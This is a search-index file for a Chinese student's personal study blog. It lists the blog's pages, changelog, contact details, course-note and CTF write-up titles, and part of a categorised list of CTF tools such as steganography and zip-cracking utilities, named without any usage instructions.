{"config":{"lang":["en"],"separator":"[\\s\\-,:!=\\[\\]()\"/]+|(?!\\b)(?=[A-Z][a-z])|\\.(?!\\d)|&[lg]t;","pipeline":["stemmer","stopWordFilter","trimmer"]},"docs":[{"location":"","title":"Darstib' Database!","text":"Welcome to Darstib's database~"},{"location":"#whats-this","title":"\u8fd9\u662f\u5565\uff1f(What's this ?)","text":"<p>\u8fd9\u91cc\u662f\u6d45\u788e\u65f6\u5149 (Darstib) \u7684\u4e00\u4e2a\u535a\u5ba2\uff0c\u5f53\u7136\u4e5f\u4f1a\u653e\u4e9b\u6742\u4e03\u6742\u516b\u7684\u8d44\u6599\u3002</p> <p>\u6700\u521d\u6211\u4e5f\u60f3\u7740\u8981\u8bb0\u5f55\u81ea\u5df1\u7684\u8bfe\u7a0b\u5b66\u4e60\u7b14\u8bb0\uff0c\u4f46\u662f\u6e10\u6e10\u5730\u53d1\u73b0\uff1a</p> <ul> <li>\u5927\u591a\u6570\u8bfe\u7a0b\u4e2d\uff0c\u5176\u4ed6\u4eba\u7684\u7b14\u8bb0\u5df2\u7136\u5341\u5206\u5b8c\u5584\uff08\u4f8b\u5982\u6570\u636e\u7ed3\u6784\u57fa\u7840\u3001\u79bb\u6563\u6570\u5b66\u3001\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u8fd9\u4e9b\uff09\uff0c\u800c\u8fd9\u4e9b\u8bfe\u7a0b\u5185\u5bb9\u5e76\u6ca1\u6709\u8f83\u5927\u6539\u52a8\uff0c\u5b9e\u5728\u6ca1\u6709\u5fc5\u8981\u518d\u53bb\u8bb0\u8f7d\uff1b\u5bf9\u4e8e\u8fd9\u4e9b\u5185\u5bb9\uff0c\u53ef\u4ee5\u5728 note_link \u67e5\u770b\u4e00\u4e9b\u5176\u4ed6\u4eba\u7684\u7b14\u8bb0\u3002</li> <li>\u76f8\u5bf9\u5730\uff0c\u6211\u9009\u62e9\u8bb0\u5f55\u201c\u8ba1\u7b97\u673a\u7cfb\u7edf\u201d \u7b49\u8fd9\u7c7b\u975e\u88ab\u5e7f\u6cdb\u5b66\u4e60\u7684\u5b66\u79d1\u7684\u7b14\u8bb0\uff08\u4e00\u822c\u4f1a\u5728\u5bf9\u5e94\u8bfe\u7a0b\u5b66\u4e60\u5b8c\u6bd5\u540e\u7684\u957f\u5047\u671f\u6574\u7406\u4e0a\u6765\u5e76\u653e\u5728 note\uff09\uff0c\u4ee5\u53ca\u4e00\u4e9b\u81ea\u5df1\u5b66\u4e60\u5176\u4ed6\u8bfe\u7a0b\u6240\u8bb0\u5f55\u7684\u7b14\u8bb0\u3002</li> </ul> <p>\u6b64\u5916\uff0c\u6211\u5c06\u4f1a\u628a\u4e00\u4e9b\u5b66\u4e60\u96f6\u788e\u7684\u6280\u80fd\u7684\u8fc7\u7a0b\u5206\u4eab\u4e8e\u6b64\uff0c\u4f5c\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p> <p>\u6700\u521d\u6211\u662f\u4e60\u60ef\u4e8e\u770b\u89c6\u9891\u5b66\u4e60\u7684\uff1b\u4f46\u662f\u540e\u6765\u53d1\u73b0\u8282\u594f\u5f88\u6162\uff0c\u6548\u7387\u4f4e\uff0c\u6539\u6210\u9605\u8bfb\u6587\u6863\u5b66\u4e60\uff0c\u8fd9\u5927\u6982\u4e5f\u662f xyx\u5b66\u957f\u6240\u9f13\u52b1\u7684\u81ea\u4e3e \uff0c\u4e5f\u5c31\u662f\u4e60\u60ef\u4e8e\u9605\u8bfb\u7b2c\u4e00\u624b\u8d44\u6599\uff0c\u51cf\u5c11\u5bf9\u591a\u65b9\u52a0\u5de5\u8fc7\u7684\u8d44\u6599\u7684\u4f9d\u8d56\u6027\uff1b\u4ee5\u81f3\u4e8e\u73b0\u5728\u6211\u5f88\u559c\u6b22\u4e00\u4e9b\u56fd\u5185\u5916\u9ad8\u6821\u516c\u5f00\u975e\u5e38\u8be6\u5c3d\u7684 notes/lab/project \u7684\u8bfe\u7a0b\uff0c\u5b83\u4eec\u57fa\u672c\u5305\u62ec\u4e86\u8bfe\u5802\u7684\u6240\u6709\u5185\u5bb9\uff0c\u975e\u5e38\u9002\u5408\u81ea\u5b66\u3002</p>"},{"location":"#content-distribution","title":"\u5185\u5bb9\u5206\u5e03 (Content Distribution)","text":"<ul> <li>index -&gt; \u672c\u9875\u9762\uff0c\u540e\u9762\u8ddf\u7740\u6700\u65b0\u7684\u968f\u7b14\uff1b<ul> <li>\u66f4\u65b0\u5c0f\u8bb0 -&gt; \u8bb0\u5f55\u4e86\u6bd4\u8f83\u91cd\u5927\u7684\u66f4\u65b0\u8bb0\u5f55\uff1b</li> <li>\u8054\u7cfb\u6211 -&gt; \u8bb0\u5f55\u4e86\u8054\u7cfb\u6211\u7684\u65b9\u5f0f\uff1b</li> <li>tags -&gt; \u8bb0\u5f55\u4e86\u5185\u5bb9\u7684\u6807\u7b7e\uff1b</li> <li>\u5f52\u6863 -&gt; \u8bb0\u5f55\u4e86\u6240\u6709\u7684\u535a\u5ba2\u6587\u7ae0\uff1b</li> </ul> </li> <li>CTF -&gt; \u8bb0\u5f55\u4e86CTF\u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b14\u8bb0\uff1b</li> <li>Collection -&gt; \u6536\u96c6\uff0c\u5305\u62ec\u4e00\u4e9b\u5de5\u5177\u3001\u8d44\u6599\u7b49\uff1b</li> <li>Note -&gt; \u7b14\u8bb0\uff0c\u4e3b\u8981\u662f\u81ea\u5df1\u7684\u4e00\u4e9b\u8bfe\u7a0b\u5b66\u4e60\u7b14\u8bb0\uff1b</li> <li>Tutorial -&gt; \u6559\u7a0b\uff0c\u5c1d\u8bd5\u4e3a \u7f51\u7ad9/\u8f6f\u4ef6 \u5de5\u5177\u7684\u4f7f\u7528\u65b9\u6cd5\u63d0\u4f9b\u6559\u7a0b\uff1b</li> <li>Summary -&gt; \u603b\u7ed3\uff0c\u968f\u4fbf\u5199\u5199\u5427\uff1b</li> <li>AboutMe&amp;Link -&gt; \u4e3b\u8981\u662f\u5173\u4e8e\u6211\u548c\u53cb\u94fe\u3002</li> </ul>"},{"location":"#who-am-i","title":"\u6211\u662f\u8c01\uff1f(Who am I ?)","text":"<p>\u6211\u662f\u6d45\u788e\u65f6\u5149 (Darstib)\uff0c\u76ee\u524d\u6b63\u4e8e\u6d59\u6c5f\u5927\u5b66\u4fe1\u606f\u5b89\u5168\u4e13\u4e1a (Information Security in Zhejiang University ) \u5c31\u8bfb\u672c\u79d1\u3002</p> <p>\u60f3\u8981\u4e86\u89e3\u66f4\u591a\uff1f\u770b\u770b\u8fd9\u91cc\u5427~</p>"},{"location":"#acknowledgments","title":"\u81f4\u8c22 (Acknowledgments)","text":"<p>\u5728\u642d\u5efa\u672c\u7f51\u7ad9\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u9047\u5230\u4e86\u8bb8\u591a\u53cb\u5584\u70ed\u60c5\u5730\u5b66\u957f\u5b66\u59d0\u4ee5\u53ca\u540c\u7ea7\u540c\u5b66\uff0c\u4ed6\u4eec\u5728\u5de5\u5177\u5b66\u4e60\u3001\u77e5\u8bc6\u5b66\u4e60\u3001\u89e3\u51b3ERROR\u7b49\u65b9\u9762\u7ed9\u4e88\u4e86\u6211\u83ab\u591a\u7684\u652f\u6301\uff0c\u4f60\u53ef\u4ee5\u5728 myworld \u4e2d Darstib \u306e friends/dalaos \u4e86\u89e3\u4ed6\u4eec\u66f4\u591a\u3002\u540c\u65f6 \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c \u6837\u5f0f\u7b80\u6d01\u7f8e\u89c2\uff0c\u8fd9\u91cc\u591a\u6709\u53c2\u8003\u3002</p> \u4e0b\u9762\u662f\u6211\u7684\u6700\u65b0\u535a\u5ba2\u6587\u7ae0~"},{"location":"changelog/","title":"\u66f4\u65b0\u8bb0\u5f55","text":"<p>Abstract</p> <p>\u6b64\u9875\u9762\u4f7f\u7528\u4e86\u6765\u81ea TonyCrane \u7684 changelog \u63d2\u4ef6\uff0c\u4e3b\u8981\u8bb0\u5f55\u4e86\u8be5\u5c0f\u7ad9\u7684\u5c0f\u66f4\u65b0\u3002</p>"},{"location":"changelog/#2025","title":"2025","text":"02-16\u00b6 <p> \u5f15\u5165 https://github.com/TonyCrane/mkdocs-toolchain/tree/master/mkdocs-toc-plugin \u5e76\u8fdb\u884c\u4fee\u6539\uff0c\u7f8e\u5316\u4e86\u76ee\u5f55\u6837\u5f0f\u3002</p> 02-13\u00b6 <p> \u4fee\u6539\u4e86\u4eae\u8272\u6a21\u5f0f\u4e0b\u7684\u7684\u914d\u8272\u6837\u5f0f\uff1b\u5bf9 callous \u5757\u8fdb\u884c\u4e86\u7f8e\u5316\uff08\u53c2\u8003\u3001\u4fee\u6539\u81ea https://github.com/IsshikiHugh/notebook/blob/main/docs/_css/extra.css \uff09\u3002</p>"},{"location":"changelog/#2024","title":"2024","text":"11-27\u00b6 <p> tutorial/python_learn</p> 10-27\u00b6 <p> CTF/ZJUCTF2024</p> 10-09\u00b6 <p> CTF</p> 09-09\u00b6 <p> Tutorial</p> 09-02\u00b6 <p> Note &gt; cs188  (updating)</p> 08-26\u00b6 <p> Collection &gt; Teachyourselfcs</p> <p> \u589e\u6dfb\u4e86 gitcus \u529f\u80fd\uff0c\u6b22\u8fce\u7559\u8a00\u4ea4\u6d41/\u6307\u6b63\uff01\uff01\uff01</p> <p> Just connect me if necessary.</p> 08-13\u00b6 <p> \u5c06\u539f Obsidian \u7684\u7b14\u8bb0\u8fc1\u79fb\u5230\u4e86 https://note-darstibs-projects.vercel.app/ \uff0c\u4ee5\u4fbf\u66f4\u597d\u5730\u5728\u7f51\u9875\u4e0a\u9605\u8bfb\u3002</p> 08-03\u00b6 <p> \u5bf9\u6587\u7ae0\u7684 tags \u8fdb\u884c\u4e86\u6574\u7406\uff0c\u66f4\u52a0\u65b9\u4fbf\u627e\u7cfb\u5217\u5185\u5bb9\u3002</p> 08-01\u00b6 <p> Collection &gt; Tools \u8fdb\u884c\u4e86\u5206\u7c7b\u3001\u589e\u6dfb\u3002</p> 07-22\u00b6 <p> \u5c06\u7f51\u7ad9\u5185\u5bb9\u7ed3\u6784\u8fdb\u884c\u8c03\u6574\uff0c\u6587\u4ef6\u5939\u5747\u589e\u6dfb\u521d\u59cb\u754c\u9762\u4ecb\u7ecd\u6587\u4ef6\u5185\u5bb9\uff0c\u4fbf\u4e8e\u5bfb\u627e\u3002</p> 06-29\u00b6 <p> \u5f15\u5165\u4e86\u9e64\u7fd4\u4e07\u91cc\u7684 `mkdocs-changlog-plugins` \uff0c\u4ee5\u53ca\u90e8\u5206\u6837\u5f0f\uff0c\u5176\u4f59\u66f4\u65b0\u5c0f\u8bb0\u5f85\u8865\u5145\u3002</p> 03-15\u00b6 <p> \u535a\u5ba2\u521d\u6b65\u642d\u5efa\u6210\u529f\uff0c\u4e5f\u662f\u8d39\u4e86\u4e00\u756a\u529f\u592b\ud83d\ude07\u3002</p>"},{"location":"connect_me/","title":"\u8054\u7cfb\u6211","text":"<p>\u6b22\u8fce\u4f18\u5148\u53d1\u9001\u90ae\u4ef6\u8fdb\u884c\u8054\u7cfb\uff0c\u4e00\u822c\u4f1a\u5728\u665a\u4e0a\u68c0\u67e5\u4e00\u904d\u90ae\u7bb1\uff1b\u5982\u786e\u5b9e\u6709\u9700\u8981/\u6bd4\u8f83\u7d27\u6025\uff0c\u6b22\u8fce\u6dfb\u52a0 QQ/Wechat \u597d\u53cb\u3002</p> <ul> <li>Gmail: darstbreed@gmail.com</li> <li>outlook: darstib@outlook.com</li> <li>QQmail: 2124278786@qq.com or darstib@qq.com</li> <li>Telegram: @Darstib</li> </ul> <p>\u8bf7\u5728\u4e0d\u5f15\u8d77\u8bef\u89e3\u7684\u60c5\u51b5\u4e0b\u7b80\u8ff0\u6765\u610f\uff08\u4f8b\u5982\uff0c\u8bf7\u4e0d\u8981\u53ea\u6709\u4e00\u4e2a\u201c\u4f60\u597d\u201d\u7b49\uff09\uff0c\u5426\u5219\u89c6\u4e3a\u5e7f\u544a\u800c\u5ffd\u89c6\uff1b\u5982\u679c\u6211\u4eec\u751a\u81f3\u6ca1\u6709\u5728\u4efb\u4f55\u5730\u65b9\u4ea4\u6d41\u8fc7\u4e00\u6b21\uff0c\u8bf7\u4e0d\u8981\u5355\u7eaf\u4e3a\u4e86\u52a0\u597d\u53cb\u800c\u52a0\u597d\u53cb\uff0c\u4e0d\u559c\u6269\u5217\u3002</p>"},{"location":"nav/","title":"Nav","text":"<ul> <li>Home<ul> <li>\u66f4\u65b0\u5c0f\u8bb0</li> <li>\u8054\u7cfb\u6211</li> <li>Tags</li> </ul> </li> <li>Collection<ul> <li>collection/*.md</li> </ul> </li> <li>Note<ul> <li>cs188<ul> <li>note<ul> <li>note/cs188/note/*.md</li> </ul> </li> <li>project<ul> <li>note/cs188/project/*.md</li> </ul> </li> <li>intro in English</li> </ul> </li> <li>physics<ul> <li>note/physics/*.md</li> </ul> </li> <li>CSys-II<ul> <li>note/CSys-II/*.md</li> </ul> </li> <li>cs70<ul> <li>note/cs70/*.md</li> </ul> </li> <li>other<ul> <li>note/other/*.md</li> </ul> </li> </ul> </li> <li>CTF<ul> <li>Tools</li> <li>ZJUCTF2024<ul> <li>CTF/ZJUCTF2024/*.md</li> </ul> </li> <li>MOECTF2024<ul> <li>CTF/MOECTF2024/*.md</li> </ul> </li> <li>ZJS-DASCTF2024<ul> <li>crypto</li> </ul> </li> <li>NOTE<ul> <li>MISC<ul> <li>CTF/NOTE/MISC/*.md</li> </ul> </li> <li>WEB<ul> <li>CTF/NOTE/WEB/*.md</li> </ul> </li> <li>Crypto<ul> <li>CTF/NOTE/CRYPTO/*.md</li> </ul> </li> <li>other<ul> <li>CTF/NOTE/other/*.md</li> </ul> </li> </ul> </li> </ul> </li> <li>Tutorial<ul> <li>python_learn<ul> <li>crypto<ul> <li>sage_math<ul> <li>tutorial/python_learn/crypto/sage_math/*.ipynb</li> </ul> </li> <li>python_lib<ul> <li>tutorial/python_learn/crypto/python_lib/*.ipynb</li> </ul> </li> </ul> </li> <li>Data<ul> <li>tutorial/python_learn/data/*.ipynb</li> </ul> </li> </ul> </li> <li>Begin<ul> <li>tutorial/begin/*.md</li> </ul> </li> <li>MIT<ul> <li>tutorial/MIT/*.md</li> </ul> </li> <li>MCM\uff08\u6570\u6a21\uff09<ul> <li>2024 \u5e74\u6d59\u6c5f\u5927\u5b66\u5927\u5b66\u751f\u6570\u5b66\u5efa\u6a21\u7ade\u8d5b</li> <li>some material in MCM</li> </ul> </li> </ul> </li> <li>Summary<ul> <li>\u5927\u4e00\u5c0f\u8bb0</li> </ul> </li> <li>Links</li> </ul>"},{"location":"tags/","title":"Tags","text":""},{"location":"tags/#tag:dmpt","title":"DMPT","text":"<ul> <li>            01 Propositional Logic          </li> <li>            02 Proof          </li> <li>            03 Mathematical Induction          </li> <li>            04 The Stable Matching Problem          </li> <li>            05 Graph Theory          </li> <li>            06 Modular Arithmetic          </li> <li>            07 Public Key Cryptography          </li> <li>            08 Polynomials          </li> <li>            09 Error Correcting Codes          </li> <li>            10 Counting          </li> <li>            11 Countability          </li> <li>            12 Self Reference and Computability          </li> <li>            13 Introduction of Discrete Probability          </li> <li>            14 Conditional Probability          </li> <li>            15 Distribution and Expectation          </li> <li>            16 Variance          </li> <li>            17 Concentration Inequalities and the Laws of Large Numbers          </li> <li>            18 Misc          </li> <li>            Discrete Mathematics and Probability Theory          </li> </ul>"},{"location":"tags/#tag:mcm","title":"MCM","text":"<ul> <li>            some material in MCM          </li> </ul>"},{"location":"tags/#tag:mit","title":"MIT","text":"<ul> <li>            0 linux shell          </li> <li>            1 shell script and basic tools          </li> <li>            2 learn to use Vim editor          </li> <li>            3 Git          </li> <li>            4 base of web          </li> </ul>"},{"location":"tags/#tag:algo","title":"algo","text":"<ul> <li>            K way merge algorithm          </li> </ul>"},{"location":"tags/#tag:begin","title":"begin","text":"<ul> <li>            Begin          </li> <li>            Chrome begin          </li> <li>            Logisim begin          </li> <li>            Mkdocs begin          </li> <li>            Obsidian begin          </li> <li>            Python begin          </li> <li>            Typst begin          </li> <li>            Url begin          </li> <li>            Utools begin          </li> </ul>"},{"location":"tags/#tag:blog","title":"blog","text":"<ul> <li>            1 shell script and basic tools          </li> <li>            2024 \u5e74\u6d59\u6c5f\u5927\u5b66\u5927\u5b66\u751f\u6570\u5b66\u5efa\u6a21\u7ade\u8d5b          </li> <li>            3 Git          </li> <li>            4 base of web          </li> <li>            5 Emmet          </li> <li>            Disable copilot on windows 11 temporarily          </li> <li>            K way merge algorithm          </li> <li>            Why we need requirements          </li> <li>            some material in MCM          </li> <li>            \u4f7f\u7528Sunshine+Moonlight\u4e32\u6d41 \u8fdc\u63a7 \u526f\u5c4f          </li> <li>            \u5c71\u897f\u9633\u6cc9 \u77ff\u533a\u8d5b\u9c7c\u5c0f\u5b66 \u5218\u6148\u6b23\u5c55\u89c8\u9986&amp;\u79d1\u5b66\u5bab          </li> <li>            \u7f51\u7edc\u76f8\u5173\u5c0f\u95ee\u9898          </li> </ul>"},{"location":"tags/#tag:collection","title":"collection","text":"<ul> <li>            Articles          </li> <li>            CTF tools          </li> <li>            Data Visualization          </li> <li>            Note link          </li> <li>            Teachyourselfcs          </li> <li>            Tools          </li> <li>            Tools          </li> </ul>"},{"location":"tags/#tag:crypto","title":"crypto","text":"<ul> <li>            Sage math          </li> <li>            \u56fd\u5bb6\u5546\u7528\u5bc6\u7801          </li> </ul>"},{"location":"tags/#tag:cs188","title":"cs188","text":"<ul> <li>            01 Intro to AI Rational Agents          </li> <li>            02 State Spaces Uninformed Search          </li> <li>            03 Informed Search Astar and Heuristics          </li> <li>            04 Local Search          </li> <li>            05 Trees Minimax Pruning          </li> <li>            06 Expectimax Monte Carlo Tree Search          </li> <li>            07 Propositional Logic and Planning          </li> <li>            08 DPLL&amp;ForwardChaining          </li> <li>            09 First Order Logic          </li> <li>            10 Intro to Probability          </li> <li>            11 Bayesian Network Intro          </li> <li>            12 Variable Elimination          </li> <li>            13 Approximate Inference          </li> <li>            14 Markov Models          </li> <li>            15 Hidden Marko Models          </li> <li>            16 PF DN VPI          </li> <li>            17 Markov Decision Processes          </li> <li>            18 Iteration          </li> <li>            19 Navie Bayes          </li> <li>            20 Perceptron          </li> <li>            21 Regression          </li> <li>            22 Neural Networks          </li> <li>            24 Reinforcement Learnin          </li> <li>            Logic          </li> <li>            MultiAgent          </li> <li>            Search          </li> <li>            The Pac-Man Projects          </li> <li>            Tracing          </li> <li>            Tutorial          </li> <li>            cs188 - sp24          </li> <li>            intro in English          </li> </ul>"},{"location":"tags/#tag:ctf","title":"ctf","text":"<ul> <li>            AI          </li> <li>            Audio          </li> <li>            Base code          </li> <li>            CRYPTO          </li> <li>            CRYPTO          </li> <li>            CTF          </li> <li>            Flow analysis          </li> <li>            Img          </li> <li>            Info leak          </li> <li>            Lattice          </li> <li>            MISC          </li> <li>            MISC          </li> <li>            MOECTF2024          </li> <li>            Osint          </li> <li>            Padding oracle attack          </li> <li>            Pyjail          </li> <li>            Qrcode          </li> <li>            REVERSE          </li> <li>            RSA attack          </li> <li>            Stream cipher          </li> <li>            Tools          </li> <li>            WEB          </li> <li>            WEB          </li> <li>            WELCOME          </li> <li>            What to do after get shell          </li> <li>            Yafu          </li> <li>            ZJS-DASCTF2024          </li> <li>            ZJUCTF2024          </li> <li>            Zip rar          </li> <li>            crypto          </li> </ul>"},{"location":"tags/#tag:misc","title":"misc","text":"<ul> <li>            Disable copilot on windows 11 temporarily          </li> </ul>"},{"location":"tags/#tag:note","title":"note","text":"<ul> <li>            1 shell script and basic tools          </li> <li>            2 learn to use Vim editor          </li> <li>            3 Git          </li> <li>            4 base of web          </li> <li>            5 Emmet          </li> <li>            Note link          </li> </ul>"},{"location":"tags/#tag:notes","title":"notes","text":"<ul> <li>            01 Intro to AI Rational Agents          </li> <li>            01 Propositional Logic          </li> <li>            02 Proof          </li> <li>            02 State Spaces Uninformed Search          </li> <li>            03 Informed Search Astar and Heuristics          </li> <li>            03 Mathematical Induction          </li> <li>            04 Local Search          </li> <li>            04 The Stable Matching Problem          </li> <li>            05 Graph Theory          </li> <li>            05 Trees Minimax Pruning          </li> <li>            06 Expectimax Monte Carlo Tree Search          </li> <li>            06 Modular Arithmetic          </li> <li>            07 Propositional Logic and Planning          </li> <li>            07 Public Key Cryptography          </li> <li>            08 DPLL&amp;ForwardChaining          </li> <li>            08 Polynomials          </li> <li>            09 Error Correcting Codes          </li> <li>            09 First Order Logic          </li> <li>            1 pipeline          </li> <li>            10 Counting          </li> <li>            10 Intro to Probability          </li> <li>            11 Bayesian Network Intro          </li> <li>            11 Countability          </li> <li>            12 Self Reference and Computability          </li> <li>            12 Variable Elimination          </li> <li>            13 Approximate Inference          </li> <li>            13 Introduction of Discrete Probability          </li> <li>            14 Conditional Probability          </li> <li>            14 Markov Models          </li> <li>            15 Distribution and Expectation          </li> <li>            15 Hidden Marko Models          </li> <li>            16 PF DN VPI          </li> <li>            16 Variance          </li> <li>            17 Concentration Inequalities and the Laws of Large Numbers          </li> <li>            17 Markov Decision Processes          </li> <li>            18 Iteration          </li> <li>            18 Misc          </li> <li>            19 Navie Bayes          </li> <li>            2 OS          </li> <li>            20 Perceptron          </li> <li>            21 Regression          </li> <li>            22 Neural Networks          </li> <li>            24 Reinforcement Learnin          </li> <li>            3 Process          </li> <li>            4 Scheduling          </li> <li>            5 IPC          </li> <li>            6 Synchronization          </li> <li>            ADS PPT          </li> <li>            ADS problems          </li> <li>            AI          </li> <li>            Audio          </li> <li>            Base code          </li> <li>            CRYPTO          </li> <li>            CRYPTO          </li> <li>            Crypto          </li> <li>            Discrete Mathematics and Probability Theory          </li> <li>            FDS questions          </li> <li>            Flow analysis          </li> <li>            Img          </li> <li>            Index          </li> <li>            Info leak          </li> <li>            Lattice          </li> <li>            Logic          </li> <li>            MISC          </li> <li>            MISC          </li> <li>            MultiAgent          </li> <li>            Osint          </li> <li>            Other          </li> <li>            PBFX          </li> <li>            Padding oracle attack          </li> <li>            Physics1 problems          </li> <li>            Physics2 problems          </li> <li>            Pyjail          </li> <li>            Qrcode          </li> <li>            REVERSE          </li> <li>            RSA attack          </li> <li>            Sage math          </li> <li>            Search          </li> <li>            Stream cipher          </li> <li>            The Pac-Man Projects          </li> <li>            Toturial          </li> <li>            Tracing          </li> <li>            Tutorial          </li> <li>            WEB          </li> <li>            WEB          </li> <li>            WELCOME          </li> <li>            What to do after get shell          </li> <li>            Yafu          </li> <li>            Zip rar          </li> <li>            crypto          </li> <li>            cs188 - sp24          </li> <li>            cs188 - sp24 note          </li> <li>            intro in English          </li> <li>            \u56fd\u5bb6\u5546\u7528\u5bc6\u7801          </li> <li>            \u5927\u7269\u5b9e\u9a8c\u6570\u636e\u5904\u7406\u811a\u672c          </li> <li>            \u5927\u7269\u5b9e\u9a8c\u7eea\u8bba\u8bfe\u4f5c\u4e1a          </li> </ul>"},{"location":"tags/#tag:physics","title":"physics","text":"<ul> <li>            Physics1 problems          </li> <li>            Physics2 problems          </li> <li>            \u5927\u7269\u5b9e\u9a8c\u6570\u636e\u5904\u7406\u811a\u672c          </li> <li>            \u5927\u7269\u5b9e\u9a8c\u7eea\u8bba\u8bfe\u4f5c\u4e1a          </li> </ul>"},{"location":"tags/#tag:summary","title":"summary","text":"<ul> <li>            \u5927\u4e00\u5c0f\u8bb0          </li> </ul>"},{"location":"tags/#tag:tool","title":"tool","text":"<ul> <li>            Why we need requirements          </li> <li>            \u4f7f\u7528Sunshine+Moonlight\u4e32\u6d41 \u8fdc\u63a7 \u526f\u5c4f          </li> </ul>"},{"location":"tags/#tag:web","title":"web","text":"<ul> <li>            5 Emmet          </li> <li>            \u7f51\u7edc\u76f8\u5173\u5c0f\u95ee\u9898          </li> </ul>"},{"location":"CTF/","title":"CTF","text":"Tools          ZJUCTF2024          <ul> <li> CRYPTO  198  229  4 mins              1739718485 </li> <li> MISC  515  290  5 mins              1739718485 </li> <li> REVERSE  42  103  1 mins              1739718485 </li> <li> WEB  29  15  0 mins              1739718485 </li> <li> WELCOME  64  0 mins              1739718485 </li> </ul> MOECTF2024          <ul> <li> MISC  1876  276  10 mins              1739718485 </li> <li> WEB  1531  315  9 mins              1739718485 </li> <li> CRYPTO  79  84  1 mins              1739718485 </li> <li> AI  52  0 mins              1739718485 </li> </ul> ZJS-DASCTF2024          <ul> <li> crypto  335  206  4 mins              1739718485 </li> </ul> NOTE          <ul> <li> MISC  2312  108  8 mins              1739718485 </li> <li> WEB  554  2 mins              1739718485 </li> <li> other  13338  2662  75 mins              1739718485 </li> <li> CRYPTO  0  0 mins              0 </li> </ul>","tags":["ctf"]},{"location":"CTF/Tools/","title":"Tools","text":"<p>Summary</p> <p>CTF \u5b66\u4e60\u8fc7\u7a0b\u4e2d\u7528\u5230\u7684\u5de5\u5177\uff1b\u540e\u6765\u4e5f\u628a\u4e00\u4e9b\u6bd4\u8f83\u597d\u7684\u6587\u7ae0\u653e\u5728\u91cc\u9762\u4e86\uff1b\u5982\u679c\u524d\u6709\u4e00\u4e2a <code>-</code> \u8868\u793a\u6211\u8fd8\u6ca1\u5177\u4f53\u770b/\u7528\u8fc7\uff0c\u4f46\u662f\u7c97\u770b\u8fd8\u4e0d\u9519\u3002</p>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_1","title":"\u7efc\u5408\u6027\u7f51\u7ad9","text":"<ul> <li>\u968f\u6ce2\u9010\u6d41</li> <li>mzy0</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_2","title":"\u5b66\u4e60\u5e73\u53f0","text":"<ul> <li>CTF-wiki</li> <li>Hello-ctf</li> <li>-Practical CTF</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_3","title":"\u7ec3\u4e60&amp;\u8d5b\u4e8b\u5e73\u53f0","text":"<ul> <li>ZJUBUS<ul> <li>\u9700\u8981 ZJU \u6821\u7f51</li> </ul> </li> <li>NSSCTF</li> <li>BUUCTF</li> <li>-\u653b\u9632\u4e16\u754c</li> <li>cryptohack or -cryptopals</li> <li>-bugku</li> <li>Ethernaut \u9898\u5e93\u95ef\u5173\u9898\u89e3</li> <li>ctftime<ul> <li>\u56fd\u5185\u5916\u77e5\u540d\u8d5b\u4e8b</li> </ul> </li> <li>-CTF-writeups-public</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#misc","title":"MISC","text":"<ul> <li>FileReverse-Tools<ul> <li>\u201c\u5bf9\u4e8c\u8fdb\u5236\u6587\u4ef6\u53cd\u8f6c\u3001\u5012\u7f6e\u4ee5\u53ca\u5341\u516d\u8fdb\u5236\u7f16\u7801\u5904\u7406\u76f8\u5173\u7684\u5de5\u5177\uff0c\u89e3\u51b3CTF\u548c\u5de5\u4f5c\u4e2d\u7684\u6587\u4ef6\u5904\u7406\u95ee\u9898\u201d</li> </ul> </li> <li>CTFCrackTools<ul> <li>\u633a\u4e45\u6ca1\u66f4\u65b0\u4e86</li> </ul> </li> <li>-PuzzleSolver<ul> <li>\u73b0\u5728\u83b7\u53d6\u9700\u8981\u4e00\u4e9b\u201c\u4ee3\u4ef7\u201d</li> </ul> </li> <li>misc\u603b\u7ed3(\u9690\u5199\u7bc7)</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_4","title":"\u56fe\u7247\u7c7b","text":"<ul> <li>Aperi'Solve<ul> <li>\u56fe\u7247\u4e00\u628a\u68ad</li> <li>Aperisolver<ul> <li>\u9879\u76ee\u4ed3\u5e93\uff0c\u652f\u6301\u672c\u5730 dockers \u8fd0\u884c</li> </ul> </li> </ul> </li> <li>steghide<ul> <li>medium\u2014\u2014Steghide Tool</li> </ul> </li> <li>Barcode \u9605\u8bfb\u5668<ul> <li>\u5f88\u591a\u7c7b\u578b\u7684\u4e8c\u7ef4\u7801\u90fd\u80fd\u626b</li> </ul> </li> <li>Barcode Generator<ul> <li>\u4e8c\u7ef4\u7801\u751f\u6210\u5668</li> </ul> </li> <li>fotoforensics<ul> <li>\u56fe\u50cf\u53d6\u8bc1\u5206\u6790</li> </ul> </li> <li>blind_watermark<ul> <li>\u76f4\u63a5\u5d4c\u5165\u7684\u76f2\u6c34\u5370</li> </ul> </li> <li>BlindWaterMark<ul> <li>\u76f8\u4f3c\u56fe\u5d4c\u5165\u7684\u76f2\u6c34\u5370</li> </ul> </li> <li>gaps<ul> <li>\u81ea\u52a8\u62fc\u56fe</li> </ul> </li> <li>Visual_cryptography<ul> <li>\u5bf9\u4e24\u5f20\u56fe\u50cf\u8fdb\u884c\u5f02\u6216</li> <li>\u4f8b\u9898</li> </ul> </li> <li> <p>Deformed-Image-Restorer</p> <ul> <li>\u56fe\u7247\u5bbd\u9ad8\u81ea\u52a8\u7206\u7834\u4fee\u590d</li> </ul> </li> <li> <p>ctf101-misc-slider</p> <ul> <li>\u4e5f\u8bb8\u8be5\u597d\u597d\u770b\u770b\uff1f</li> </ul> </li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_5","title":"\u538b\u7f29\u5305","text":"<ul> <li>APPNOTE-6.3.9.TXT<ul> <li>4.0 ZIP Files</li> </ul> </li> <li>hashcat</li> <li>zip \u4f2a\u52a0\u5bc6\u68c0\u6d4b</li> <li>CRC32-Tools<ul> <li>CRC\u78b0\u649e\u5168\u81ea\u52a8\u5316\u811a\u672c</li> </ul> </li> <li>bkcrack<ul> <li>zip\u660e\u6587\u653b\u51fb</li> <li>\u4f7f\u7528\u660e\u6587\u653b\u51fb\u7834\u89e3\u52a0\u5bc6\u7684zip\u6587\u4ef6</li> </ul> 